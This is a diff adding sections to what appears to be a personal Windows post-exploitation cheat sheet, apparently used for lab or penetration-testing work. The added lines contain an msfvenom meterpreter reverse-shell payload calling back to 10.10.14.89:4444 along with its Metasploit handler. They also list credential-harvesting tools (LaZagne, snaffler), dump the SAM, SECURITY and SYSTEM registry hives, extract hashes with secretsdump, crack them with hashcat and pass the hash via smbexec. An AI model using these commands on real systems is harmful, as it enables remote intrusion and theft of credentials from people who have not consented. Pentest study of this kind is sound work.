@@ -21,9 +21,46 @@ Version    BuildNumber
  - Get env variables: `set`
  - Get installed Windows patched:  `Get-Hotfix` or `wmic qfe`
  - Get installed programs: `Get-WmiObject -Class Win32_Product |  select Name, Version` or `wmic product get name`
- - User enumerations with rpcclient : [rpcclient](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration). Other tools: [nulllinux](https://github.com/m8sec/nullinux), [NetExec](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration)
-
+ - User enumerations with rpcclient : 
+   * [rpcclient](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration). 
+   * [nulllinux](https://github.com/m8sec/nullinux)
+   * [NetExec](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration)
+   * impacket-lookupsid
  - `runas /savecred /user:ad\bob "command"`
+
+## Create reverse shell
+
+```
+msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.14.89 lport=4444 -f exe -o reverse.exe
+
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter_reverse_tcp
+set lhost 10.10.14.89
+set lport 4444
+run
+```
+
+## When connected
+
+ - `.\winPeas.ps1`
+ - `LaZagne all`
+ - `SharpUp audit`
+ - `snaffler -s -o result.log -i C:`
+ 
+## When system
+
+```
+> reg save HKLM\SAM sam.save
+> reg save HKLM\SECURITY security.save
+> reg save HKLM\SYSTEM system.save
+> impacket-secretsdump -system system.save -sam sam.save -security security.save local
+...
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: > in creds.txt ou pass the ahash 
+...
+> hashcat -a 0 -m 1000 ~/creds.txt rockyou.txt 
+> impact-smbexe -hashes <xxxx>
+```
 
 ## File
 
